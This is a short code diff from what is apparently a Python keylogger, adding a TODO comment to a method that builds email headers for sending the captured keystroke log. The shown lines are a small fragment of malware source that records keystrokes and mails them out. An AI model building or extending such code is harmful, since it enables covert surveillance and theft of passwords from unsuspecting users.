@@ -54,6 +54,7 @@ class Keylogger:
         self.log += name
     
     def send_email(self, email, pwd, msg):
+        # TODO: change title of email to start and end date of log
         headers = [
             "Subject: " + "log: " + str(self.end_dt),
             "Content-Type: text/html"
